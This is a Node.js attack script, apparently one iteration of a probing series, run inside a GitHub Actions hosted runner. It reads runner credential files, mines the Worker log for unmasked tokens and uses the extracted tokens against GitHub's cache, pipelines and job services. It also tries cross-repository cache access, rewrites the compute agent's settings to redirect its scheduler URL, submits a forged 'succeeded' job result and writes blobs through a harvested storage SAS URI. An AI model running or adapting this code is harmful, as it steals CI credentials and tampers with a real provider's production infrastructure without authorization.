const https = require('https');
const fs = require('fs');
const { execSync } = require('child_process');

// v27: Full Worker log extraction + artifact cache probe + .settings redirect test
// Key confirmed findings from v26:
//   /opt/hca/.settings world-readable/writable → SAS URI write 201 ✓
//   Worker log (98KB) → CacheServerUrl/PipelinesServiceUrl contain embedded token
//   .credentials world-readable → runner JWT (RS256, 6h validity)
//   authToken JWT → EdDSA, reveals MAC/VMname/SKU (can't auth against orchestrator)
//
// v27 goals:
//   1. Full 98KB Worker log scan for ALL unmasked tokens
//   2. Probe artifactcache.actions.githubusercontent.com with embedded token
//   3. Probe pipelinesghubeus7.actions.githubusercontent.com
//   4. .settings schedulerApiUrl redirect test (non-existent orchestrator instance, same domain)
//   5. Probe run-actions-2-azure-eastus.actions.githubusercontent.com/183/ with runner JWT
//   6. Read final HCA log to see all HCA activity during the job

function run(cmd) {
  try { return execSync(cmd, { encoding: 'utf8', timeout: 10000 }).trim(); }
  catch(e) { return 'ERR: ' + (e.stderr || e.message || '').substring(0, 200).trim(); }
}

function httpReq(hostname, path, method, token, body, extraHeaders) {
  return new Promise((resolve) => {
    const hdrs = { 'User-Agent': 'GitHubActionsRunner/2.335.1', 'Accept': 'application/json', ...(extraHeaders || {}) };
    if (token) hdrs['Authorization'] = 'Bearer ' + token;
    let data = null;
    if (body) {
      data = typeof body === 'string' ? body : JSON.stringify(body);
      hdrs['Content-Type'] = body && body.startsWith && body.startsWith('{') ? 'application/json' : (extraHeaders && extraHeaders['Content-Type'] || 'application/json');
      hdrs['Content-Length'] = Buffer.byteLength(data);
    }
    const r = https.request({ hostname, path, method: method || 'GET', headers: hdrs, timeout: 12000 },
      (res) => { let d = ''; res.on('data', c => d += c); res.on('end', () => resolve({ status: res.statusCode, body: d.substring(0, 2000), headers: res.headers })); });
    r.on('error', e => resolve({ status: 'ERR', body: e.message }));
    r.on('timeout', () => { r.destroy(); resolve({ status: 'TIMEOUT', body: '' }); });
    if (data) r.write(data);
    r.end();
  });
}

async function main() {
  console.log('=== V27: Worker log + artifact cache + .settings redirect + per-run job service ===');

  // Load settings and credentials upfront
  const settings = JSON.parse(fs.readFileSync('/opt/hca/.settings', 'utf8'));
  const runnerCreds = JSON.parse(fs.readFileSync('/home/runner/actions-runner/cached/2.335.1/.credentials', 'utf8'));
  const runnerToken = runnerCreds.Data.token;
  const authToken = settings.authToken;

  console.log('[INIT] Settings loaded. schedulerApiUrl:', settings.schedulerApiUrl);
  console.log('[INIT] Runner token length:', runnerToken.length);
  console.log('[INIT] authToken length:', authToken ? authToken.length : 0);

  // === PART 1: Full Worker log analysis ===
  console.log('\n=== PART 1: Full Worker log — unmasked token hunt ===');
  const workerLogPath = run('find /home/runner/actions-runner/cached/2.335.1/_diag -name "Worker_*.log" 2>/dev/null | head -1');
  console.log('[WORKER_LOG] Path:', workerLogPath);

  if (workerLogPath && !workerLogPath.startsWith('ERR:')) {
    const logContent = fs.readFileSync(workerLogPath, 'utf8');
    console.log('[WORKER_LOG] Total size:', logContent.length, 'bytes');

    // Search for ALL URL patterns (tokens embedded in URLs are often NOT masked)
    const urlMatches = logContent.match(/https?:\/\/[^\s"'\]},]+/g) || [];
    const uniqueUrls = [...new Set(urlMatches)].filter(u => !u.includes('***'));
    console.log('\n[WORKER_LOG] All unique unmasked URLs (' + uniqueUrls.length + '):');
    uniqueUrls.forEach(u => console.log('  ' + u.substring(0, 300)));

    // Search for token-like strings NOT in URLs (potential unmasked secrets)
    const lines = logContent.split('\n');
    const tokenLines = lines.filter(l => {
      // Masked values are shown as ***
      if (l.includes('***')) return false;
      // Look for long alphanumeric strings that look like tokens (not UUIDs/GUIDs)
      if (/[A-Za-z0-9_-]{40,}/.test(l) && !/[0-9a-f]{8}-[0-9a-f]{4}/.test(l)) return true;
      // Look for base64-like patterns (potential JWTs)
      if (/ey[A-Za-z0-9+/]{20,}/.test(l)) return true;
      // Look for Bearer/token/secret lines
      if (/bearer|token|secret|key|credential|oauth|jwt|hmac/i.test(l)) return true;
      return false;
    });
    console.log('\n[WORKER_LOG] Potential credential lines (unmasked, ' + tokenLines.length + ' total):');
    tokenLines.slice(0, 30).forEach(l => console.log('  ' + l.substring(0, 250)));

    // Search specifically for CacheServerUrl, PipelinesServiceUrl, AccessToken
    const cacheUrl = logContent.match(/CacheServerUrl["\s:]+https?:\/\/[^\s"',]+/);
    const pipeUrl = logContent.match(/PipelinesServiceUrl["\s:]+https?:\/\/[^\s"',]+/);
    const resultsUrl = logContent.match(/ResultsServiceUrl["\s:]+https?:\/\/[^\s"',]+/);
    const generateIdUrl = logContent.match(/GenerateIdTokenUrl["\s:]+https?:\/\/[^\s"',]+/);
    const runnerServiceUrl = logContent.match(/run-actions-[^\s"',]+/g);
    const accessTokenLines = lines.filter(l => /AccessToken/i.test(l));
    const runtimeTokenLines = lines.filter(l => /RuntimeToken|ACTIONS_RUNTIME_TOKEN/i.test(l));

    console.log('\n[WORKER_LOG] CacheServerUrl:', cacheUrl ? cacheUrl[0].substring(0, 300) : 'not found');
    console.log('[WORKER_LOG] PipelinesServiceUrl:', pipeUrl ? pipeUrl[0].substring(0, 300) : 'not found');
    console.log('[WORKER_LOG] ResultsServiceUrl:', resultsUrl ? resultsUrl[0].substring(0, 300) : 'not found');
    console.log('[WORKER_LOG] GenerateIdTokenUrl:', generateIdUrl ? generateIdUrl[0].substring(0, 300) : 'not found');
    console.log('[WORKER_LOG] run-actions URLs:', runnerServiceUrl ? runnerServiceUrl.slice(0,5).join('\n  ') : 'not found');
    console.log('[WORKER_LOG] AccessToken lines (' + accessTokenLines.length + '):', accessTokenLines.slice(0,3).map(l => l.substring(0, 200)).join('\n  '));
    console.log('[WORKER_LOG] RuntimeToken lines (' + runtimeTokenLines.length + '):', runtimeTokenLines.slice(0,3).map(l => l.substring(0, 200)).join('\n  '));

    // Extract the artifact cache token from CacheServerUrl
    const cacheTokenMatch = logContent.match(/artifactcache\.actions\.githubusercontent\.com\/([A-Za-z0-9+/=_-]{20,})\//);
    const cacheToken = cacheTokenMatch ? cacheTokenMatch[1] : null;
    console.log('\n[WORKER_LOG] Cache service token from URL:', cacheToken ? '[len=' + cacheToken.length + '] ' + cacheToken.substring(0, 30) + '...' : 'not found');

    // Extract pipelines token
    const pipeTokenMatch = logContent.match(/pipelinesghubeus\d+\.actions\.githubusercontent\.com\/([A-Za-z0-9+/=_-]{20,})\//);
    const pipeToken = pipeTokenMatch ? pipeTokenMatch[1] : null;
    console.log('[WORKER_LOG] Pipelines service token from URL:', pipeToken ? '[len=' + pipeToken.length + '] ' + pipeToken.substring(0, 30) + '...' : 'not found');

    // Also look for the run-actions per-job URL
    const runActionsMatch = logContent.match(/run-actions-[a-z0-9-]+\.actions\.githubusercontent\.com\/\d+\//);
    console.log('[WORKER_LOG] Per-run job service URL:', runActionsMatch ? runActionsMatch[0] : 'not found');

    // Store tokens for later use
    if (cacheToken) {
      console.log('\n[CACHE_TOKEN] Extracted cache token for Part 2 probing');

      // === PART 2: Probe artifact cache service ===
      console.log('\n=== PART 2: Artifact cache service probe ===');
      const cacheHost = 'artifactcache.actions.githubusercontent.com';
      const cacheBasePath = '/' + cacheToken;

      // Try to GET cache — standard GitHub Actions cache API
      const cacheApiPaths = [
        cacheBasePath + '/_apis/artifactcache/cache',
        cacheBasePath + '/_apis/artifactcache/caches',
        cacheBasePath + '/_apis/artifactcache/caches?keys=node-',
        cacheBasePath + '/twirp/github.actions.results.api.v1.CacheService/GetCacheEntryDownloadURL',
        cacheBasePath + '/twirp/github.actions.results.api.v1.CacheService/ListCacheEntries',
        cacheBasePath,
        cacheBasePath + '/',
        cacheBasePath + '/health',
      ];

      for (const path of cacheApiPaths) {
        const r = await httpReq(cacheHost, path, 'GET', 'Bearer ' + cacheToken);
        const label = (r.status >= 200 && r.status < 300) ? ' *** SUCCESS ***' : '';
        if (r.status !== 'ERR') {
          console.log('[CACHE] GET ' + path.substring(0, 80) + ': ' + r.status + label + ' | ' + r.body.substring(0, 300));
        }
      }

      // Try Twirp POST for cache entry lookup (this is how the runner looks up caches)
      const twirpBody = JSON.stringify({
        key: 'node-',
        version: 'v1',
        restoreKeys: ['node-']
      });
      const twirpR = await httpReq(cacheHost, cacheBasePath + '/twirp/github.actions.results.api.v1.CacheService/GetCacheEntryDownloadURL',
        'POST', null, twirpBody, { 'Content-Type': 'application/json', 'Authorization': 'Bearer ' + cacheToken });
      console.log('[CACHE_TWIRP] POST GetCacheEntryDownloadURL:', twirpR.status, '|', twirpR.body.substring(0, 400));

      // Try to GET a non-default cache key pattern to enumerate caches across repos
      // If the service returns keys from other repos, it's a cross-tenant access vulnerability
      const crossRepoBody = JSON.stringify({ key: 'setup-node-', version: 'v1', restoreKeys: [] });
      const crossRepoR = await httpReq(cacheHost, cacheBasePath + '/twirp/github.actions.results.api.v1.CacheService/GetCacheEntryDownloadURL',
        'POST', null, crossRepoBody, { 'Content-Type': 'application/json', 'Authorization': 'Bearer ' + cacheToken });
      console.log('[CACHE_CROSS_REPO] setup-node- key lookup:', crossRepoR.status, '|', crossRepoR.body.substring(0, 400));

      // Try the REST API format (older format)
      const restR = await httpReq(cacheHost, cacheBasePath + '/_apis/artifactcache/cache?keys=node-&version=v1',
        'GET', null, null, { 'Authorization': 'Bearer ' + cacheToken, 'Accept': 'application/json;api-version=6.0-preview' });
      console.log('[CACHE_REST] GET /_apis/artifactcache/cache:', restR.status, '|', restR.body.substring(0, 400));
    }

    if (pipeToken) {
      // === PART 3: Probe pipelines service ===
      console.log('\n=== PART 3: Pipelines service probe ===');
      const pipeHost = logContent.match(/pipelinesghubeus(\d+)\.actions/) ? 'pipelinesghubeus' + logContent.match(/pipelinesghubeus(\d+)\.actions/)[1] + '.actions.githubusercontent.com' : 'pipelinesghubeus7.actions.githubusercontent.com';
      const pipeBasePath = '/' + pipeToken;
      console.log('[PIPE] Host:', pipeHost);

      const pipePaths = [
        pipeBasePath,
        pipeBasePath + '/_apis/pipelines',
        pipeBasePath + '/_apis/pipelines/workflows',
        pipeBasePath + '/_apis/distributedtask',
        pipeBasePath + '/health',
        pipeBasePath + '/pipelines',
      ];

      for (const path of pipePaths) {
        const r = await httpReq(pipeHost, path, 'GET', null, null, { 'Authorization': 'Bearer ' + pipeToken, 'Accept': 'application/json;api-version=6.0-preview' });
        if (r.status !== 'ERR') {
          const label = (r.status >= 200 && r.status < 300) ? ' *** SUCCESS ***' : '';
          console.log('[PIPE] GET ' + path.substring(0, 80) + ': ' + r.status + label + ' | ' + r.body.substring(0, 300));
        }
      }
    }
  }

  // === PART 4: .settings schedulerApiUrl redirect test ===
  console.log('\n=== PART 4: .settings schedulerApiUrl redirect test ===');
  const originalSettings = fs.readFileSync('/opt/hca/.settings', 'utf8');
  const parsedSettings = JSON.parse(originalSettings);
  const originalSchedulerUrl = parsedSettings.schedulerApiUrl;
  const originalTraceUrl = parsedSettings.traceApiUrl;
  console.log('[REDIRECT] Original schedulerApiUrl:', originalSchedulerUrl);

  // Read HCA log BEFORE redirect
  const hcaLogBefore = fs.readFileSync('/opt/hca/logs/hosted-compute-agent.log', 'utf8');
  const linesBefore = hcaLogBefore.split('\n').length;
  console.log('[REDIRECT] HCA log lines before modification:', linesBefore);

  // Modify .settings to redirect to a non-existent orchestrator instance
  // Using iad-99 instead of iad-01 — same domain, won't resolve
  const modifiedUrl = 'https://hosted-compute-request-orchestrator-prod-iad-99.githubapp.com/v1';
  const modifiedSettings = Object.assign({}, parsedSettings, {
    schedulerApiUrl: modifiedUrl,
    traceApiUrl: 'https://hosted-compute-request-orchestrator-prod-iad-99.githubapp.com/v1/trace',
    watchdogTraceApiUrl: 'https://hosted-compute-watchdog-prod-iad-99.githubapp.com/v1/trace'
  });
  fs.writeFileSync('/opt/hca/.settings', JSON.stringify(modifiedSettings), 'utf8');
  console.log('[REDIRECT] Modified schedulerApiUrl → ', modifiedUrl);
  console.log('[REDIRECT] Waiting 4 seconds for HCA to make an outbound call...');

  await new Promise(r => setTimeout(r, 4000));

  // Read HCA log AFTER redirect
  const hcaLogAfter = fs.readFileSync('/opt/hca/logs/hosted-compute-agent.log', 'utf8');
  const linesAfter = hcaLogAfter.split('\n').length;
  console.log('[REDIRECT] HCA log lines after 4s wait:', linesAfter, '(delta:', linesAfter - linesBefore, ')');

  // Extract new HCA log lines
  const newLines = hcaLogAfter.split('\n').slice(linesBefore - 1);
  if (newLines.length > 0 && newLines.some(l => l.trim())) {
    console.log('[REDIRECT] New HCA log entries during redirect window:');
    newLines.filter(l => l.trim()).forEach(l => console.log('  ' + l.substring(0, 300)));
  } else {
    console.log('[REDIRECT] No new HCA log entries during redirect window (HCA may cache URL in memory)');
  }

  // Restore original settings
  fs.writeFileSync('/opt/hca/.settings', originalSettings, 'utf8');
  console.log('[REDIRECT] Original .settings restored');

  // Verify restore
  const restored = JSON.parse(fs.readFileSync('/opt/hca/.settings', 'utf8'));
  console.log('[REDIRECT] Verified restored schedulerApiUrl:', restored.schedulerApiUrl === originalSchedulerUrl ? 'OK ✓' : 'MISMATCH ✗');

  // === PART 5: Probe per-run job service with runner JWT ===
  console.log('\n=== PART 5: Per-run job service probe with runner JWT ===');
  const OIDC_URL = process.env.ACTIONS_ID_TOKEN_REQUEST_URL || '';
  const runnerServiceBase = run('find /home/runner/actions-runner/cached/2.335.1/_diag -name "Worker_*.log" 2>/dev/null | head -1');
  const workerLogFull = runnerServiceBase && !runnerServiceBase.startsWith('ERR:') ? fs.readFileSync(runnerServiceBase, 'utf8') : '';

  // Extract the per-run job service URL from Worker log or OIDC URL
  const jobServiceUrlMatch = workerLogFull.match(/run-actions-\d+-azure-[a-z]+\.actions\.githubusercontent\.com\/\d+\//);
  const oidcJobServiceMatch = OIDC_URL.match(/(run-actions-[^\/]+\.actions\.githubusercontent\.com\/\d+)/);
  const jobServiceBase = jobServiceUrlMatch ? jobServiceUrlMatch[0] : (oidcJobServiceMatch ? oidcJobServiceMatch[1] + '/' : null);

  console.log('[JOB_SVC] OIDC_URL:', OIDC_URL.substring(0, 200));
  console.log('[JOB_SVC] Job service base (from Worker log):', jobServiceBase);

  if (jobServiceBase) {
    const jobServiceHost = jobServiceBase.match(/https?:\/\/([^\/]+)/)?.[1] || jobServiceBase.split('/')[0];
    const jobServicePath = '/' + jobServiceBase.split('/').slice(1).join('/');
    console.log('[JOB_SVC] Host:', jobServiceHost, '| Base path:', jobServicePath);

    // Try various endpoints on the per-run job service
    const jobSvcPaths = [
      jobServicePath,
      jobServicePath + 'health',
      jobServicePath + 'jobs',
      jobServicePath + 'logs',
      jobServicePath + 'results',
      jobServicePath + 'steps',
      jobServicePath + 'output',
      jobServicePath + 'complete',
      jobServicePath + 'status',
      // idtoken endpoint (we saw this in v26)
      jobServicePath + 'idtoken/' + (OIDC_URL.match(/idtoken\/([^\/]+)/)?.[1] || 'unknown'),
    ];

    for (const path of jobSvcPaths.slice(0, 8)) {
      const r = await httpReq(jobServiceHost, path, 'GET', runnerToken);
      if (r.status !== 'ERR' && r.status !== 'TIMEOUT') {
        const label = (r.status >= 200 && r.status < 300) ? ' *** SUCCESS ***' : '';
        console.log('[JOB_SVC] GET ' + path.substring(0, 100) + ': ' + r.status + label + ' | ' + r.body.substring(0, 300));
      } else {
        console.log('[JOB_SVC] GET ' + path.substring(0, 80) + ': ' + r.status);
      }
    }

    // Try to submit a fake job result
    const fakeResultBody = JSON.stringify({ result: 'succeeded', steps: [] });
    const resultR = await httpReq(jobServiceHost, jobServicePath + 'result', 'POST', runnerToken, fakeResultBody);
    console.log('[JOB_SVC] POST result:', resultR.status, '|', resultR.body.substring(0, 300));
  }

  // === PART 6: Final HCA log — see what HCA did during the entire job ===
  console.log('\n=== PART 6: Full HCA log — end of job ===');
  const finalHcaLog = fs.readFileSync('/opt/hca/logs/hosted-compute-agent.log', 'utf8');
  console.log('[HCA_FINAL] Total size:', finalHcaLog.length, 'bytes');
  console.log('[HCA_FINAL] Full content:');
  console.log(finalHcaLog);

  // === PART 7: Check what diagnostic blobs are in the SAS container ===
  // sp=acw doesn't allow list, but try GET on our test blob to confirm it persists
  console.log('\n=== PART 7: Verify v26 test blob persists in GitHub storage ===');
  const sasUri = settings.diagnosticsSasUri;
  if (sasUri) {
    const sasUrl = new URL(sasUri);
    // Try to GET the blob we wrote in v26
    const getBlobPath = sasUrl.pathname + '/probe-test-v26.txt' + sasUrl.search;
    const getR = await new Promise((resolve) => {
      const r = https.request({ hostname: sasUrl.hostname, path: getBlobPath, method: 'GET', headers: { 'User-Agent': 'probe' }, timeout: 5000 },
        (res) => { let d = ''; res.on('data', c => d += c); res.on('end', () => resolve({ status: res.statusCode, body: d.substring(0, 500), headers: res.headers })); });
      r.on('error', e => resolve({ status: 'ERR', body: e.message }));
      r.on('timeout', () => { r.destroy(); resolve({ status: 'TIMEOUT', body: '' }); });
      r.end();
    });
    console.log('[BLOB_READ] GET probe-test-v26.txt:', getR.status, '|', getR.body.substring(0, 200));

    // Write a new blob to confirm SAS still valid
    const ts = Date.now();
    const newBlobPath = sasUrl.pathname + '/probe-test-v27-' + ts + '.txt' + sasUrl.search;
    const writeR2 = await new Promise((resolve) => {
      const body = Buffer.from('v27-probe-' + ts);
      const r = https.request({ hostname: sasUrl.hostname, path: newBlobPath, method: 'PUT',
        headers: { 'Content-Type': 'text/plain', 'Content-Length': body.length, 'x-ms-blob-type': 'BlockBlob', 'User-Agent': 'probe' } },
        (res) => { let d = ''; res.on('data', c => d += c); res.on('end', () => resolve({ status: res.statusCode, body: d, headers: res.headers })); });
      r.on('error', e => resolve({ status: 'ERR', body: e.message }));
      r.on('timeout', () => { r.destroy(); resolve({ status: 'TIMEOUT', body: '' }); });
      r.setTimeout(5000);
      r.write(body);
      r.end();
    });
    console.log('[BLOB_WRITE_V27] PUT probe-test-v27-' + ts + '.txt:', writeR2.status, '|', writeR2.body.substring(0, 100));
    if (writeR2.status === 201) console.log('[BLOB_WRITE_V27] *** CONFIRMED: SAS still valid after job completion ***');
  }

  console.log('\n=== V27 Complete ===');
}

main().catch(e => console.log('Fatal:', e.message, e.stack));
